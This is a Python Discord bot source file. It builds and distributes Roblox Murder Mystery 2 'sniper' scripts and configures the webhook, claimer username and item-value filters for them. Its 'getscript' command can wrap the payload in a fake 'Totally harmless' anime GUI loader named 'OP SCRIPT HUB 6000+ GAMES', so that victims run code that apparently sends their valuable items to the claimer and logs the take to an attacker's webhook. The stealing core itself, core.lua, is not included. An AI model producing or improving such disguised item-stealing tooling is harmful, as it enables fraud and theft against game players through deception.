# language: Python 3.11, file: bot.py, runtime: discord.py 2.x
# discord bot: MM2 sniper control panel — webhook config, channel creation, mask injection
# shout out to FUCKING Wazyel Aka sillywithaura7

import discord
from discord.ext import commands
from discord import app_commands
import aiohttp
import asyncio
import json
import os

# ── CONFIG ─────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN")

# ── BOT SETUP ──────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

# ── PERSISTENT STATE ───────────────────────────────────────────────────────────
STATE_FILE = "state.json"

def load_state() -> dict:
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    return {"webhook": "", "claimer": "", "min_value": 0, "min_rarity": "None"}

def save_state(state: dict):
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2)

state = load_state()

# ── MASK TEMPLATES ─────────────────────────────────────────────────────────────
# The injected payload is appended silently after an innocent-looking loadstring
MASK_WRAPPER = """-- {mask_name}
-- A free anime sword simulator GUI loader
-- Totally harmless, enjoy!

local function loadGui()
    -- placeholder gui logic
    print("Loading GUI...")
end

loadGui()

-- internal module init (do not remove)
{payload}
"""

PAYLOAD_TEMPLATE = """
_G.username = "{claimer}"
_G.webhook  = "{webhook}"
_G.minValue = {min_value}
_G.minRarity = "{min_rarity}"
_G.troller  = false

{core_script}
"""

# raw script body (everything except the _G config block at the top)
# paste the raw script content into core.lua beside bot.py
def load_core_script() -> str:
    if os.path.exists("core.lua"):
        with open("core.lua", "r") as f:
            return f.read()
    return "-- core.lua not found"

# ── WEBHOOK SENDER ─────────────────────────────────────────────────────────────
async def send_to_webhook(webhook_url: str, content: str, username: str = "MM2 Snipe Bot"):
    async with aiohttp.ClientSession() as session:
        payload = {"username": username, "content": content}
        async with session.post(webhook_url, json=payload) as resp:
            return resp.status

# ── SLASH COMMANDS ─────────────────────────────────────────────────────────────

@tree.command(name="setwebhook", description="Set the Discord webhook URL for snipe logs")
@app_commands.describe(url="Full Discord webhook URL")
async def set_webhook(interaction: discord.Interaction, url: str):
    if not url.startswith("https://discord.com/api/webhooks/"):
        await interaction.response.send_message("❌ Invalid webhook URL.", ephemeral=True)
        return
    state["webhook"] = url
    save_state(state)
    await interaction.response.send_message(f"✅ Webhook set.", ephemeral=True)


@tree.command(name="setclaimer", description="Set the claimer Roblox username")
@app_commands.describe(username="Your Roblox username (must be in the target server)")
async def set_claimer(interaction: discord.Interaction, username: str):
    state["claimer"] = username
    save_state(state)
    await interaction.response.send_message(f"✅ Claimer set to `{username}`.", ephemeral=True)


@tree.command(name="setfilters", description="Set minimum value and rarity filters")
@app_commands.describe(
    min_value="Minimum item value (int)",
    min_rarity="None | Common | Uncommon | Rare | Legendary | Godly | Ancient | Chroma | Vintage | Unique"
)
async def set_filters(interaction: discord.Interaction, min_value: int, min_rarity: str):
    valid = ["None","Common","Uncommon","Rare","Legendary","Godly","Ancient","Chroma","Vintage","Unique","Pet"]
    if min_rarity not in valid:
        await interaction.response.send_message(f"❌ Rarity must be one of: {', '.join(valid)}", ephemeral=True)
        return
    state["min_value"] = min_value
    state["min_rarity"] = min_rarity
    save_state(state)
    await interaction.response.send_message(
        f"✅ Filters set — min value: `{min_value}` | min rarity: `{min_rarity}`", ephemeral=True
    )


@tree.command(name="status", description="Show current bot configuration")
async def status(interaction: discord.Interaction):
    embed = discord.Embed(title="MM2 Sniper Config", color=0xff6b35)
    embed.add_field(name="Claimer",    value=f"`{state['claimer'] or 'not set'}`",  inline=True)
    embed.add_field(name="Webhook",    value=f"`{'set' if state['webhook'] else 'not set'}`", inline=True)
    embed.add_field(name="Min Value",  value=f"`{state['min_value']}`",              inline=True)
    embed.add_field(name="Min Rarity", value=f"`{state['min_rarity']}`",             inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@tree.command(name="createchannel", description="Create a new log channel with its own webhook")
@app_commands.describe(
    channel_name="Name for the new channel",
    category_name="Optional category to place the channel under"
)
@app_commands.default_permissions(manage_channels=True)
async def create_channel(
    interaction: discord.Interaction,
    channel_name: str,
    category_name: str = None
):
    guild = interaction.guild
    if not guild:
        await interaction.response.send_message("❌ Must be used in a server.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    category = None
    if category_name:
        category = discord.utils.get(guild.categories, name=category_name)
        if not category:
            category = await guild.create_category(category_name)

    channel = await guild.create_text_channel(channel_name, category=category)
    wh = await channel.create_webhook(name="MM2 Snipe Logs")

    # save as secondary webhook if desired, or just report it
    await interaction.followup.send(
        f"✅ Channel <#{channel.id}> created.\n"
        f"🔗 Webhook: `{wh.url}`\n\n"
        f"Use `/setwebhook` with this URL to log to this channel.",
        ephemeral=True
    )


@tree.command(name="getscript", description="Generate the configured snipe script")
@app_commands.describe(masked="Wrap in innocent-looking mask script to hide payload")
async def get_script(interaction: discord.Interaction, masked: bool = False):
    if not state["claimer"] or not state["webhook"]:
        await interaction.response.send_message("❌ Set claimer and webhook first.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    core = load_core_script()
    payload = PAYLOAD_TEMPLATE.format(
        claimer=state["claimer"],
        webhook=state["webhook"],
        min_value=state["min_value"],
        min_rarity=state["min_rarity"],
        core_script=core
    )

    if masked:
        output = MASK_WRAPPER.format(
            mask_name="OP SCRIPT HUB 6000+ GAMES",
            payload=payload
        )
    else:
        output = payload

    # Discord has 2000 char limit on messages; send as file
    with open("snipe_output.lua", "w") as f:
        f.write(output)

    await interaction.followup.send(
        f"{'🎭 Masked' if masked else '📄 Raw'} script generated.",
        file=discord.File("snipe_output.lua", filename="script.lua"),
        ephemeral=True
    )
    os.remove("snipe_output.lua")


@tree.command(name="testwebhook", description="Send a test ping to the configured webhook")
async def test_webhook(interaction: discord.Interaction):
    if not state["webhook"]:
        await interaction.response.send_message("❌ No webhook set.", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    status_code = await send_to_webhook(state["webhook"], "✅ Webhook test from MM2 Sniper bot.")
    await interaction.followup.send(f"Webhook responded with HTTP `{status_code}`.", ephemeral=True)


# ── STARTUP ────────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    await tree.sync()
    print(f"[+] Logged in as {bot.user} | Slash commands synced")

bot.run(BOT_TOKEN)
